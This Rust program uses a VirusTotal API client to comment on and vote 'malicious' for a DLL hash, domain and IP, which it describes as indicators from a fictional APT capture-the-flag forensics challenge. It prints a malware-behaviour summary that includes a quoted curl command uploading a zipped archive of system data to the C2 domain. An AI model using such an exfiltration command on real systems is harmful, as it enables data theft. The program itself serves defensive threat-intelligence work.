use std::env;
use tokio::time::{sleep, Duration};
use virustotal_rs::{ApiTier, ClientBuilder, VoteVerdict};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Get API key from environment variable
    let api_key = env::var("VTI_API_KEY").expect("VTI_API_KEY environment variable not set");

    println!("Using API key from VTI_API_KEY environment variable");

    // Create client
    let client = ClientBuilder::new()
        .api_key(api_key)
        .tier(ApiTier::Public)
        .build()?;

    // Resources from the CTF
    let dll_hash = "02032ea322036e66f2825a0342979ad942ad5e201a674dc1c0085617467d661c"; // 7z.dll
    let domain = "office.msftupdated.com";
    let ip = "35.208.137.212";

    println!("\n{}", "=".repeat(60));
    println!("🎯 CTF CONTEXT: APT 111 - DFIR Challenge");
    println!("{}", "=".repeat(60));
    println!("\nThis is a simulated threat for a DFIR CTF challenge:");
    println!("• Threat Group: APT 111 (fictional)");
    println!("• Malware: 7z.dll (DLL side-loading)");
    println!("• C2 Domain: office.msftupdated.com");
    println!("• C2 IP: 35.208.137.212");

    // Analysis of the DLL strings shows it collects system info and exfiltrates to the C2
    println!("\n📝 Malware Behavior (from strings analysis):");
    println!("• Collects system info: ipconfig, tasklist, net commands");
    println!("• Archives data: zip.exe 1.zip 1.txt");
    println!("• Exfiltrates to C2: curl.exe -F file=@1.zip https://office.msftupdater.com");
    println!("• Cleans up: rm 1.txt, rm 1.zip");

    println!("\n{}", "=".repeat(60));
    println!("💬 ADDING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));

    // Add comment to the DLL file
    println!("\n📝 Adding comment to 7z.dll...");
    match client.files().add_comment(
        dll_hash,
        "APT 111 malware sample from DFIR CTF. DLL side-loading technique using legitimate 7z.dll. \
         Collects system info (ipconfig, netstat, tasklist) and exfiltrates to office.msftupdated.com. \
         #CTF #APT111 #DLLSideLoading"
    ).await {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        },
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
            if e.to_string().contains("204") || e.to_string().contains("quota") {
                println!("  Note: Rate limit reached (4 req/min for public API)");
            }
        }
    }

    // Small delay to avoid rate limiting
    sleep(Duration::from_secs(15)).await;

    // Add vote to the DLL file
    println!("\n🗳️ Voting on 7z.dll as malicious...");
    match client
        .files()
        .add_vote(dll_hash, VoteVerdict::Malicious)
        .await
    {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    sleep(Duration::from_secs(15)).await;

    // Add comment to the domain
    println!("\n📝 Adding comment to domain...");
    match client.domains().add_comment(
        domain,
        "APT 111 C2 domain from DFIR CTF. Receives exfiltrated data from DLL side-loading malware. \
         Hosted on Google Cloud (35.208.137.212). #CTF #APT111 #C2"
    ).await {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        },
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
        }
    }

    sleep(Duration::from_secs(15)).await;

    // Add vote to the domain
    println!("\n🗳️ Voting on domain as malicious...");
    match client
        .domains()
        .add_vote(domain, VoteVerdict::Malicious)
        .await
    {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    sleep(Duration::from_secs(15)).await;

    // Add comment to the IP
    println!("\n📝 Adding comment to IP address...");
    match client.ip_addresses().add_comment(
        ip,
        "APT 111 C2 server from DFIR CTF. Google Cloud IP hosting malicious domain office.msftupdated.com. \
         Receives exfiltrated data from DLL side-loading attack. #CTF #APT111"
    ).await {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        },
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
        }
    }

    sleep(Duration::from_secs(15)).await;

    // Add vote to the IP
    println!("\n🗳️ Voting on IP as malicious...");
    match client
        .ip_addresses()
        .add_vote(ip, VoteVerdict::Malicious)
        .await
    {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    println!("\n{}", "=".repeat(60));
    println!("📊 VERIFYING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));

    sleep(Duration::from_secs(15)).await;

    // Check file comments and votes
    println!("\n🔍 Checking 7z.dll comments and votes...");
    match client.files().get_comments_with_limit(dll_hash, 5).await {
        Ok(comments) => {
            println!("  Comments ({}):", comments.data.len());
            for comment in comments.data.iter().take(3) {
                println!(
                    "    • {}",
                    comment
                        .object
                        .attributes
                        .text
                        .chars()
                        .take(80)
                        .collect::<String>()
                );
            }
        }
        Err(e) => println!("  Error: {}", e),
    }

    match client.files().get_votes(dll_hash).await {
        Ok(votes) => {
            let malicious = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
                .count();
            let harmless = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
                .count();
            println!("  Votes: {} malicious, {} harmless", malicious, harmless);
        }
        Err(e) => println!("  Error getting votes: {}", e),
    }

    // Check domain comments and votes
    println!("\n🔍 Checking domain comments and votes...");
    match client.domains().get_comments_with_limit(domain, 5).await {
        Ok(comments) => {
            println!("  Comments ({}):", comments.data.len());
            for comment in comments.data.iter().take(3) {
                println!(
                    "    • {}",
                    comment
                        .object
                        .attributes
                        .text
                        .chars()
                        .take(80)
                        .collect::<String>()
                );
            }
        }
        Err(e) => println!("  Error: {}", e),
    }

    match client.domains().get_votes(domain).await {
        Ok(votes) => {
            let malicious = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
                .count();
            let harmless = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
                .count();
            println!("  Votes: {} malicious, {} harmless", malicious, harmless);
        }
        Err(e) => println!("  Error getting votes: {}", e),
    }

    println!("\n{}", "=".repeat(60));
    println!("✅ CTF THREAT INTELLIGENCE DOCUMENTED!");
    println!("{}", "=".repeat(60));
    println!("\n📌 Summary:");
    println!("  • Added context about APT 111 CTF challenge");
    println!("  • Documented DLL side-loading technique");
    println!("  • Marked malicious indicators for CTF participants");
    println!("  • Created threat intelligence trail for DFIR analysis");

    Ok(())
}
